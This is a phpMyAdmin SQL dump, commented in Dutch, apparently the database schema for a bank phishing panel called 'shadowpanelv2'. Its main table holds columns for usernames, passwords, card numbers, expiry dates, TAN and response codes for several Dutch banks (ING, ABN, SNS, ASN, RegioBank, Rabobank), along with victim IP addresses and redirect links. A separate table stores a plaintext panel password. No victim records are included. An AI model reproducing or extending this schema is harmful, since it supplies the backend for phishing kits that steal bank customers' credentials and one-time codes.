-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/localhost
--
-- Host: 127.0.0.1
-- Gegenereerd op: 11 aug 2021 om 23:41
-- Serverversie: 10.4.11-MariaDB
-- PHP-versie: 7.2.31



/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `shadowpanelv2`
--

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `pass`
--

CREATE TABLE `pass` (
  `id` int(11) NOT NULL,
  `wachtwoord` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Gegevens worden geëxporteerd voor tabel `pass`
--

INSERT INTO `pass` (`id`, `wachtwoord`) VALUES
(1, 'reliable');

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `request_data`
--

CREATE TABLE `request_data` (
  `id` int(11) NOT NULL,
  `current` varchar(32) DEFAULT NULL,
  `link` varchar(32) DEFAULT NULL,
  `ipaddress` varchar(32) DEFAULT NULL,
  `bank` varchar(32) DEFAULT NULL,
  `token` varchar(32) DEFAULT NULL,
  `inguser` varchar(32) DEFAULT NULL,
  `ingpass` varchar(32) DEFAULT NULL,
  `inglogincheck` varchar(32) DEFAULT NULL,
  `ingpasnummer` varchar(32) DEFAULT NULL,
  `ingvervaldatum` varchar(32) DEFAULT NULL,
  `ingloginchecktwo` varchar(32) DEFAULT NULL,
  `ingtancode` varchar(32) DEFAULT NULL,
  `inglogincheckthree` varchar(32) DEFAULT NULL,
  `abnrekening` varchar(32) DEFAULT NULL,
  `abnpasnummer` varchar(32) DEFAULT NULL,
  `abnresponsone` varchar(32) DEFAULT NULL,
  `abnresponscheck` varchar(32) DEFAULT NULL,
  `abnresponscode` varchar(32) DEFAULT NULL,
  `abnresponstwo` varchar(32) DEFAULT NULL,
  `abnresponschecktwo` varchar(32) DEFAULT NULL,
  `abnidentificatie` varchar(32) DEFAULT NULL,
  `abnresponscheckthree` varchar(32) DEFAULT NULL,
  `snsrespons` varchar(32) DEFAULT NULL,
  `snsresponscheckone` varchar(32) DEFAULT NULL,
  `snsresponscode` varchar(32) DEFAULT NULL,
  `snsresponstwo` varchar(32) DEFAULT NULL,
  `snsresponschecktwo` varchar(32) DEFAULT NULL,
  `asnrespons` varchar(32) DEFAULT NULL,
  `asnresponscheckone` varchar(32) DEFAULT NULL,
  `asnresponscode` varchar(32) DEFAULT NULL,
  `asnresponstwo` varchar(32) DEFAULT NULL,
  `asnresponschecktwo` varchar(32) DEFAULT NULL,
  `regiorespons` varchar(32) DEFAULT NULL,
  `regioresponscheckone` varchar(32) DEFAULT NULL,
  `regioresponscode` varchar(32) DEFAULT NULL,
  `regioresponstwo` varchar(32) DEFAULT NULL,
  `regioresponschecktwo` varchar(32) DEFAULT NULL,
  `raborekeningnummer` varchar(32) DEFAULT NULL,
  `rabopasnummer` varchar(32) DEFAULT NULL,
  `raboresponscheckone` varchar(256) DEFAULT NULL,
  `raboresponscode` varchar(256) DEFAULT NULL,
  `raboresponsone` varchar(32) DEFAULT NULL,
  `raboresponschecktwo` varchar(32) DEFAULT NULL,
  `raboresponscodetwo` varchar(256) DEFAULT NULL,
  `raboresponstwo` varchar(32) DEFAULT NULL,
  `raboresponscheckthree` varchar(32) DEFAULT NULL,
  `raboidentification` varchar(32) DEFAULT NULL,
  `raboresponscheckfour` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `request_information`
--

CREATE TABLE `request_information` (
  `id` int(11) NOT NULL,
  `naam` varchar(32) DEFAULT NULL,
  `bedrag` varchar(32) DEFAULT NULL,
  `beschrijving` varchar(32) DEFAULT NULL,
  `rekeningnummer` varchar(32) DEFAULT NULL,
  `link` varchar(32) DEFAULT NULL,
  `verzoek` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `request_link`
--

CREATE TABLE `request_link` (
  `id` int(11) NOT NULL,
  `link` varchar(256) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Gegevens worden geëxporteerd voor tabel `request_link`
--

INSERT INTO `request_link` (`id`, `link`) VALUES
(1, 'https://www.google.nl');

--
-- Indexen voor geëxporteerde tabellen
--

--
-- Indexen voor tabel `pass`
--
ALTER TABLE `pass`
  ADD PRIMARY KEY (`id`);

--
-- Indexen voor tabel `request_data`
--
ALTER TABLE `request_data`
  ADD PRIMARY KEY (`id`);

--
-- Indexen voor tabel `request_information`
--
ALTER TABLE `request_information`
  ADD PRIMARY KEY (`id`);

--
-- Indexen voor tabel `request_link`
--
ALTER TABLE `request_link`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT voor geëxporteerde tabellen
--

--
-- AUTO_INCREMENT voor een tabel `pass`
--
ALTER TABLE `pass`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT voor een tabel `request_data`
--
ALTER TABLE `request_data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=596;

--
-- AUTO_INCREMENT voor een tabel `request_information`
--
ALTER TABLE `request_information`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=234;

--
-- AUTO_INCREMENT voor een tabel `request_link`
--
ALTER TABLE `request_link`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
